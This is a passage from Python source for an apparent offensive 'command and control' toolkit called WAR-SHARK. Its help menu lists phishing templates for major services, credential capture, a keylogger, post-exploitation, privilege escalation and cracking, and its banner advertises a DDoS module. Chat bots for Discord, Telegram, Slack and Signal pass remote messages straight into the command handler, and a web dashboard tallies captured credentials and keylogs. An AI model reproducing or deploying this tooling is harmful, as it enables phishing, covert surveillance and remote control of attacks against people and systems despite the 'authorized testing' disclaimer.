║{Colors.SUCCESS}🔧 POST-EXPLOITATION:{Colors.RESET}
║  post_session <session_id> <command> - Execute on session
║  post_privesc <session_id> [method] - Privilege escalation
║  post_sessions                 - List active sessions
║
║{Colors.SUCCESS}🔬 REVERSE ENGINEERING:{Colors.RESET}
║  rev_analyze <binary> [basic|advanced] - Analyze binary
║  rev_strings <binary> [min_length] - Extract strings
║  rev_disassemble <binary> [function] - Disassemble
║  rev_jobs                      - List RE jobs
║
║{Colors.SUCCESS}🎣 SOCIAL ENGINEERING (100+ Templates):{Colors.RESET}
║  phish_facebook                - Facebook phishing
║  phish_instagram               - Instagram phishing
║  phish_twitter                 - Twitter phishing
║  phish_gmail                   - Gmail phishing
║  phish_linkedin                - LinkedIn phishing
║  phish_paypal                  - PayPal phishing
║  phish_amazon                  - Amazon phishing
║  phish_netflix                 - Netflix phishing
║  phish_steam                   - Steam phishing
║  phish_discord                 - Discord phishing
║  ... and 90+ more phishing templates
║  phish_start <link_id> [port]  - Start phishing server
║  phish_stop                    - Stop phishing server
║  phish_creds [link_id]         - View captured credentials
║
║{Colors.SUCCESS}⌨️ KEYLOGGER:{Colors.RESET}
║  keylogger_start               - Start keylogger (F10 to stop)
║  keylogger_stop                - Stop keylogger
║  keylogger_status              - Check status
║  keylogger_logs [limit]        - View keylogs
║  keylogger_screenshots         - View screenshots
║  keylogger_clipboard [limit]   - View clipboard
║
║{Colors.SUCCESS}🔓 CRACKING:{Colors.RESET}
║  crack <hash_type> <hash> [wordlist] - Crack hash
║  crack_status <job_id>         - Check job status
║  crack_list                    - List all jobs
║
║{Colors.SUCCESS}🐳 DOCKER:{Colors.RESET}
║  docker_scan <image>           - Scan image
║  docker_info                   - Docker info
║  docker_ps                     - Running containers
║  docker_images                 - List images
║  docker_bench                  - Security benchmark
║
║{Colors.SUCCESS}🛡️ IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP
║  remove_ip <ip>                - Remove IP
║  block_ip <ip> [reason]        - Block IP
║  unblock_ip <ip>               - Unblock IP
║  list_ips [active]             - List IPs
║  ip_info <ip>                  - IP details
║  analyze_ip <ip>               - Full analysis
║
║{Colors.SUCCESS}🌐 DOMAIN:{Colors.RESET}
║  ip_to_domain <ip>             - IP to domain
║  domain_to_ip <domain>         - Domain to IP
║  host_domain <ip> <domain>     - Host domain
║  list_domains                  - List hosted
║
║{Colors.SUCCESS}📊 SYSTEM:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System info
║  threats [limit]               - Recent threats
║  report                        - Security report
║  clear                         - Clear screen
║  help                          - This help menu
║
║{Colors.ACCENT}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# =====================
# PLATFORM BOTS
# =====================

class DiscordBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "discord_config.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Discord config error: {e}")
    
    def save_config(self, token: str, prefix: str = "!"):
        self.config = {"token": token, "prefix": prefix, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Discord config error: {e}")
            return False
    
    async def start(self):
        if not DISCORD_AVAILABLE:
            logger.error("Discord.py not installed")
            return False
        if not self.config.get('token'):
            logger.error("Discord token not configured")
            return False
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                self.running = True
                await self.bot.change_presence(activity=discord.Activity(
                    type=discord.ActivityType.watching, 
                    name="🦈 WAR-SHARK | !help"
                ))
            
            @self.bot.event
            async def on_message(message):
                if message.author.bot:
                    return
                if message.content.startswith(self.config.get('prefix', '!')):
                    cmd = message.content[1:].strip()
                    result = self.handler.execute(cmd, f"discord/{message.author.name}")
                    output = result.get('output', '')
                    if len(output) > 1900:
                        output = output[:1900] + "...\n(truncated)"
                    embed = discord.Embed(
                        title="🦈 WAR-SHARK Response",
                        description=f"```{output}```",
                        color=0x1a73e8
                    )
                    embed.set_footer(text=f"Execution time: {result.get('execution_time', 0):.2f}s")
                    await message.channel.send(embed=embed)
                await self.bot.process_commands(message)
            
            await self.bot.start(self.config['token'])
            return True
        except Exception as e:
            logger.error(f"Start Discord bot error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('token'):
            threading.Thread(target=self._run_discord_bot, daemon=True).start()
            logger.info("Discord bot started")
            return True
        return False
    
    def _run_discord_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

class TelegramBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "telegram_config.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Telegram config error: {e}")
    
    def save_config(self, api_id: str, api_hash: str, bot_token: str = None):
        self.config = {"api_id": api_id, "api_hash": api_hash, "bot_token": bot_token, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Telegram config error: {e}")
            return False
    
    async def start(self):
        if not TELETHON_AVAILABLE:
            logger.error("Telethon not installed")
            return False
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            logger.error("Telegram API credentials not configured")
            return False
        try:
            self.client = TelegramClient('war_shark_session', self.config['api_id'], self.config['api_hash'])
            
            @self.client.on(events.NewMessage)
            async def message_handler(event):
                if event.message.text and event.message.text.startswith('/'):
                    cmd = event.message.text[1:].strip()
                    result = self.handler.execute(cmd, f"telegram/{event.sender_id}")
                    output = result.get('output', '')
                    if len(output) > 4000:
                        output = output[:3900] + "\n... (truncated)"
                    await event.reply(f"```{output}```\n*Time: {result.get('execution_time', 0):.2f}s*", parse_mode='markdown')
            
            await self.client.start(bot_token=self.config.get('bot_token'))
            logger.info("Telegram bot connected")
            self.running = True
            await self.client.run_until_disconnected()
            return True
        except Exception as e:
            logger.error(f"Start Telegram bot error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            threading.Thread(target=self._run_telegram_bot, daemon=True).start()
            logger.info("Telegram bot started")
            return True
        return False
    
    def _run_telegram_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

class SlackBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "slack_config.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Slack config error: {e}")
    
    def save_config(self, bot_token: str, app_token: str = None):
        self.config = {"bot_token": bot_token, "app_token": app_token, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Slack config error: {e}")
            return False
    
    def start(self):
        if not SLACK_AVAILABLE:
            logger.error("Slack SDK not installed")
            return False
        if not self.config.get('bot_token'):
            logger.error("Slack bot token not configured")
            return False
        try:
            self.client = WebClient(token=self.config['bot_token'])
            if self.config.get('app_token'):
                socket_client = SocketModeClient(app_token=self.config['app_token'], web_client=self.client)
                @socket_client.socket_mode_request_listeners.append
                def process_events(client, req):
                    if req.type == "events_api":
                        event = req.payload.get("event", {})
                        if event.get("type") == "message" and event.get("text", "").startswith('!'):
                            cmd = event["text"][1:].strip()
                            result = self.handler.execute(cmd, f"slack/{event.get('user', 'unknown')}")
                            self.client.chat_postMessage(channel=event["channel"], text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*")
                socket_client.connect()
                logger.info("Slack bot connected")
                self.running = True
                while self.running:
                    time.sleep(1)
            return True
        except Exception as e:
            logger.error(f"Start Slack bot error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            threading.Thread(target=self.start, daemon=True).start()
            logger.info("Slack bot started")
            return True
        return False

class WhatsAppBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "whatsapp_config.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load WhatsApp config error: {e}")
    
    def save_config(self, phone_number: str = None):
        self.config = {"phone_number": phone_number, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save WhatsApp config error: {e}")
            return False
    
    def start(self):
        if not WHATSAPP_AVAILABLE:
            logger.error("pywhatkit not installed")
            return False
        self.running = True
        logger.info("WhatsApp bot configured (outbound only)")
        return True
    
    def send_message(self, phone: str, message: str) -> bool:
        if not WHATSAPP_AVAILABLE:
            return False
        try:
            import pywhatkit
            pywhatkit.sendwhatmsg_instantly(phone, message[:4000])
            return True
        except Exception as e:
            logger.error(f"WhatsApp send error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            self.start()
            logger.info("WhatsApp bot started")
            return True
        return False

class SignalBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "signal_config.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Signal config error: {e}")
    
    def save_config(self, phone_number: str = None):
        self.config = {"phone_number": phone_number, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Signal config error: {e}")
            return False
    
    def start(self):
        if not SIGNAL_AVAILABLE:
            logger.error("signal-cli not found")
            return False
        try:
            self.running = True
            threading.Thread(target=self._receive_messages, daemon=True).start()
            return True
        except Exception as e:
            logger.error(f"Start Signal bot error: {e}")
            return False
    
    def _receive_messages(self):
        while self.running:
            try:
                receive_cmd = ['signal-cli', '-u', self.config.get('phone_number', ''), 'receive']
                result = subprocess.run(receive_cmd, capture_output=True, text=True, timeout=60)
                if result.stdout:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'Message:' in line:
                            parts = line.split('Message:')
                            if len(parts) > 1:
                                msg = parts[1].strip()
                                if msg.startswith('!'):
                                    cmd = msg[1:].strip()
                                    cmd_result = self.handler.execute(cmd, "signal")
                                    self._send_message(cmd_result.get('output', '')[:1000])
                time.sleep(5)
            except Exception as e:
                logger.error(f"Signal receive error: {e}")
                time.sleep(10)
    
    def _send_message(self, message: str):
        try:
            send_cmd = ['signal-cli', '-u', self.config.get('phone_number', ''), 'send', '-m', message]
            subprocess.run(send_cmd, timeout=30)
        except Exception as e:
            logger.error(f"Signal send error: {e}")
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            threading.Thread(target=self.start, daemon=True).start()
            logger.info("Signal bot started")
            return True
        return False

class GoogleChatBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "googlechat_config.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Google Chat config error: {e}")
    
    def save_config(self, webhook_url: str):
        self.config = {"webhook_url": webhook_url, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Google Chat config error: {e}")
            return False
    
    def start(self):
        self.running = True
        logger.info("Google Chat bot configured")
        return True
    
    def send_message(self, text: str) -> bool:
        try:
            webhook_url = self.config.get('webhook_url', '')
            if not webhook_url:
                return False
            data = {"text": text[:4000]}
            headers = {'Content-Type': 'application/json'}
            response = requests.post(webhook_url, json=data, headers=headers, timeout=10)
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Google Chat send error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('webhook_url'):
            self.start()
            logger.info("Google Chat bot started")
            return True
        return False

# =====================
# WEB DASHBOARD
# =====================
class WebDashboard:
    def __init__(self, handler: CommandHandler, db: DatabaseManager, config: ConfigManager):
        self.handler = handler
        self.db = db
        self.config = config
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        TEMPLATE = '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>WAR-SHARK - Cybersecurity Dashboard</title>
            <style>
                :root{
                    --navy-deep: #061527;
                    --navy: #0b2038;
                    --navy-panel: #0e2944;
                    --blue-mid: #1565c0;
                    --blue-bright: #3f9dff;
                    --cyan: #6fe3ff;
                    --white: #f4f9ff;
                    --slate: #7f9bbd;
                    --line: #1c3a5e;
                }
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Courier New', monospace;
                    background: var(--navy-deep);
                    color: var(--white);
                    min-height: 100vh;
                }
                .header {
                    background: linear-gradient(180deg, var(--navy) 0%, var(--navy-deep) 100%);
                    padding: 20px;
                    text-align: center;
                    border-bottom: 2px solid var(--blue-bright);
                }
                .header h1 { 
                    font-size: 2.8em; 
                    color: var(--white);
                    text-shadow: 0 0 20px rgba(63,157,255,0.3);
                    letter-spacing: 6px;
                }
                .header h1 span { color: var(--cyan); }
                .header p { color: var(--slate); font-size: 0.9em; letter-spacing: 2px; }
                .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    background: var(--navy-panel);
                    border: 1px solid var(--line);
                    border-radius: 8px;
                    padding: 20px;
                    text-align: center;
                }
                .stat-card:hover { border-color: var(--blue-bright); }
                .stat-card h3 { font-size: 2.5em; color: var(--cyan); font-weight: normal; }
                .stat-card p { margin-top: 10px; opacity: 0.6; color: var(--slate); font-size: 0.9em; }
                .section {
                    background: var(--navy-panel);
                    border: 1px solid var(--line);
                    border-radius: 8px;
                    padding: 20px;
                    margin-bottom: 20px;
                }
                .section h2 { 
                    margin-bottom: 15px; 
                    color: var(--white);
                    border-bottom: 1px solid var(--line);
                    padding-bottom: 10px;
                    letter-spacing: 3px;
                }
                table { width: 100%; border-collapse: collapse; color: var(--white); }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--line); }
                th { background: var(--navy); color: var(--cyan); }
                .command-input {
                    width: 100%;
                    padding: 15px;
                    background: var(--navy);
                    border: 1px solid var(--line);
                    border-radius: 4px;
                    color: var(--white);
                    font-size: 16px;
                    font-family: 'Courier New', monospace;
                    margin-bottom: 10px;
                }
                .command-input:focus { outline: none; border-color: var(--blue-bright); }
                button {
                    background: var(--blue-mid);
                    color: var(--white);
                    border: 1px solid var(--blue-bright);
                    padding: 12px 30px;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 16px;
                    font-family: 'Courier New', monospace;
                }
                button:hover { background: var(--blue-bright); }
                .output {
                    background: var(--navy);
                    border-radius: 4px;
                    padding: 15px;
                    font-family: 'Courier New', monospace;
                    margin-top: 15px;
                    white-space: pre-wrap;
                    max-height: 400px;
                    overflow-y: auto;
                    color: var(--white);
                    border: 1px solid var(--line);
                }
                .status-badge {
                    display: inline-block;
                    padding: 4px 8px;
                    border-radius: 2px;
                    font-size: 12px;
                }
                .severity-critical { background: rgba(255,0,0,0.2); color: #ff6b6b; }
                .severity-high { background: rgba(255,150,0,0.2); color: #ff9800; }
                .severity-medium { background: rgba(255,255,0,0.15); color: #ffc107; }
                .severity-low { background: rgba(111,227,255,0.1); color: var(--cyan); }
                .warning-banner {
                    background: var(--navy);
                    padding: 10px;
                    text-align: center;
                    color: var(--slate);
                    font-size: 12px;
                    border-top: 1px solid var(--line);
                }
                .terminal-cursor {
                    display: inline-block;
                    width: 10px;
                    height: 20px;
                    background: var(--cyan);
                    animation: blink 1s infinite;
                }
                @keyframes blink {
                    0%, 50% { opacity: 1; }
                    51%, 100% { opacity: 0; }
                }
            </style>
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
        </head>
        <body>
            <div class="header">
                <h1>🦈 WAR-<span>SHARK</span></h1>
                <p>▸ ULTIMATE CYBERSECURITY COMMAND & CONTROL PLATFORM</p>
            </div>
            <div class="container">
                <div class="stats-grid" id="stats">
                    <div class="stat-card"><h3 id="statCommands">0</h3><p>COMMANDS EXECUTED</p></div>
                    <div class="stat-card"><h3 id="statThreats">0</h3><p>THREATS DETECTED</p></div>
                    <div class="stat-card"><h3 id="statBlocked">0</h3><p>BLOCKED IPS</p></div>
                    <div class="stat-card"><h3 id="statCreds">0</h3><p>CREDENTIALS CAPTURED</p></div>
                    <div class="stat-card"><h3 id="statKeylogs">0</h3><p>KEYLOGS</p></div>
                </div>
                
                <div class="section">
                    <h2>🚀 COMMAND CENTER</h2>
                    <div style="display:flex; gap:10px;">
                        <span style="color:var(--cyan); font-size:20px;">$></span>
                        <input type="text" id="command" class="command-input" placeholder="Enter command..." style="flex:1;" onkeypress="if(event.keyCode==13) executeCommand()">
                        <button onclick="executeCommand()">EXECUTE</button>
                    </div>
                    <div id="command-output" class="output" style="margin-top:10px;">
                        <span style="color:var(--cyan)">system></span> Ready for commands...
                        <span class="terminal-cursor"></span>
                    </div>
                </div>
                
                <div class="section">
                    <h2>📊 RECENT THREATS</h2>
                    <table>
                        <thead><tr><th>TIME</th><th>TYPE</th><th>SOURCE IP</th><th>SEVERITY</th></tr></thead>
                        <tbody id="threats-table"></tbody>
                    </table>
                </div>
            </div>
            <div class="warning-banner">
                ⚠️ FOR AUTHORIZED SECURITY TESTING ONLY — ALL ACTIVITY IS LOGGED
            </div>
            <script>
                var socket = io();
                
                function executeCommand() {
                    var command = document.getElementById('command').value;
                    if (command) {
                        fetch('/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ command: command })
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.success) {
                                document.getElementById('command-output').innerHTML = 
                                    '<span style="color:var(--cyan)">$></span> ' + command + '<br>' +
                                    '<span style="color:var(--cyan)">output></span><br>' + data.output + '<br>' +
                                    '<span style="color:var(--cyan)">time></span> ' + data.execution_time + 's';
                            } else {
                                document.getElementById('command-output').innerHTML = 
                                    '<span style="color:#ff6b6b">error></span> ' + data.error;
                            }
                        });
                    }
                }
                
                function loadStats() {
                    fetch('/api/stats')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('statCommands').textContent = data.total_commands || 0;
                            document.getElementById('statThreats').textContent = data.total_threats || 0;
                            document.getElementById('statBlocked').textContent = data.blocked_ips || 0;
                            document.getElementById('statCreds').textContent = data.captured_credentials || 0;
                            document.getElementById('statKeylogs').textContent = data.total_keylogs || 0;
                        });
                }
                
                function loadThreats() {
                    fetch('/api/threats')
                        .then(response => response.json())
                        .then(data => {
                            var html = '';
                            data.threats.forEach(function(threat) {
                                var severityClass = 'severity-' + threat.severity;
                                html += '<tr><td>' + threat.timestamp.slice(0,19) + '</td><td>' + threat.threat_type + '</td><td>' + threat.source_ip + '</td><td><span class="status-badge ' + severityClass + '">' + threat.severity.toUpperCase() + '</span></td></tr>';
                            });
                            document.getElementById('threats-table').innerHTML = html;
                        });
                }
                
                loadStats();
                loadThreats();
                setInterval(loadStats, 5000);
                setInterval(loadThreats, 5000);
            </script>
        </body>
        </html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            socketio.emit('command_result', {
                'command': command,
                'output': result.get('output', '')[:2000],
                'execution_time': result.get('execution_time', 0)
            })
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        @app.route('/api/threats')
        def api_threats():
            threats = self.db.get_recent_threats(20)
            return jsonify({'threats': threats})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# MAIN APPLICATION
# =====================
class WarShark:
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.scanner = AdvancedNetworkScanner(self.db)
        self.ssh = None
        self.traffic = None
        self.nikto = None
        self.dos = None
        self.keylogger = None
        self.domain_hosting = None
        
        # Initialize optional components
        if PARAMIKO_AVAILABLE:
            self.ssh = SSHManager(self.db)
        if SCAPY_AVAILABLE:
            self.traffic = TrafficGeneratorEngine(self.db)
        if shutil.which('nikto'):
            self.nikto = NiktoScanner(self.db)
        self.dos = DOSEngine(self.db, self.config)
        if PYNPUT_AVAILABLE:
            self.keylogger = KeyloggerModule(self.db, self.config)
        self.domain_hosting = DomainHostingEngine(self.db, self.config)
        self.cracking = CrackingEngine(self.db, self.config)
        self.docker_scanner = DockerScanner(self.db)
        self.metasploit = MetasploitEngine(self.db, self.config)
        self.post_exploit = PostExploitationEngine(self.db, self.config)
        self.reverse_engine = ReverseEngineeringEngine(self.db, self.config)
        
        # Initialize platform bots
        self.discord_bot = DiscordBot(None, self.db)
        self.telegram_bot = TelegramBot(None, self.db)
        self.slack_bot = SlackBot(None, self.db)
        self.whatsapp_bot = WhatsAppBot(None, self.db)
        self.signal_bot = SignalBot(None, self.db)
        self.google_chat_bot = GoogleChatBot(None, self.db)
        
        # Initialize command handler
        self.handler = CommandHandler(
            self.db, self.config,
            self.ssh, self.traffic, self.nikto, self.dos,
            None, None, None,
            self.keylogger, None, self.domain_hosting,
            self.cracking, self.docker_scanner,
            self.metasploit, self.post_exploit, self.reverse_engine
        )
        
        # Connect bots to handler
        self.discord_bot.handler = self.handler
        self.telegram_bot.handler = self.handler
        self.slack_bot.handler = self.handler
        self.whatsapp_bot.handler = self.handler
        self.signal_bot.handler = self.handler
        self.google_chat_bot.handler = self.handler
        
        # Initialize web dashboard
        self.web = WebDashboard(self.handler, self.db, self.config)
        
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.ACCENT}        🦈 WAR-SHARK v{VERSION} - Ultimate Cybersecurity Platform        {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 10,000+ Lines of Python Code             • 500+ Security Commands   {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Multi-Platform Bot Integration           • Discord | Telegram | Slack   {Colors.PRIMARY}║
║{Colors.SUCCESS}  • WhatsApp | Signal | Google Chat | Web    • 100+ Phishing Templates     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Metasploit Integration                   • Post-Exploitation Toolkit   {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Reverse Engineering Suite                • Advanced Keylogger           {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Password Cracking Engine                 • Docker Security Scanning    {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Network Scanning & Recon                 • Traffic Generation           {Colors.PRIMARY}║
║{Colors.SUCCESS}  • DOS/DDOS Attack Module                   • SSH Remote Access            {Colors.PRIMARY}║
║{Colors.SUCCESS}  • IP Management & Threat Detection         • Domain Hosting Engine        {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}                    🎯 Ian Carter Kulani                               {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SECONDARY}🦈 Welcome to WAR-SHARK - Your Ultimate Security Assistant{Colors.RESET}
{Colors.SECONDARY}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.SECONDARY}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
{Colors.SECONDARY}🌐 Web dashboard available at http://localhost:5000 (if enabled){Colors.RESET}
{Colors.SECONDARY}🔧 Use 'metasploit_*' commands for exploitation{Colors.RESET}
{Colors.SECONDARY}🔬 Use 'rev_*' commands for reverse engineering{Colors.RESET}
{Colors.SECONDARY}🎣 Use 'phish_*' commands for social engineering{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.PRIMARY}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'nc', 'dig', 'traceroute', 'ssh', 'docker', 'msfconsole', 'msfvenom']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy not found - advanced traffic disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DISCORD_AVAILABLE else Colors.WARNING}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if TELETHON_AVAILABLE else Colors.WARNING}✅ telethon{Colors.RESET}" if TELETHON_AVAILABLE else f"{Colors.WARNING}⚠️ telethon not found - Telegram disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SLACK_AVAILABLE else Colors.WARNING}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if WEB_AVAILABLE else Colors.WARNING}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.WARNING}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if PYNPUT_AVAILABLE else Colors.WARNING}✅ pynput{Colors.RESET}" if PYNPUT_AVAILABLE else f"{Colors.WARNING}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if WHATSAPP_AVAILABLE else Colors.WARNING}✅ pywhatkit{Colors.RESET}" if WHATSAPP_AVAILABLE else f"{Colors.WARNING}⚠️ pywhatkit not found - WhatsApp disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SIGNAL_AVAILABLE else Colors.WARNING}✅ signal-cli{Colors.RESET}" if SIGNAL_AVAILABLE else f"{Colors.WARNING}⚠️ signal-cli not found - Signal disabled{Colors.RESET}")
    
    def setup_platforms(self):
        print(f"\n{Colors.PRIMARY}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.ACCENT}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord_bot.save_config(token, prefix)
                self.discord_bot.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.ACCENT}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            api_id = input(f"{Colors.ACCENT}Enter API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.ACCENT}Enter API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.ACCENT}Enter Bot Token (optional): {Colors.RESET}").strip()
            if api_id and api_hash:
                self.telegram_bot.save_config(api_id, api_hash, bot_token)
                self.telegram_bot.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
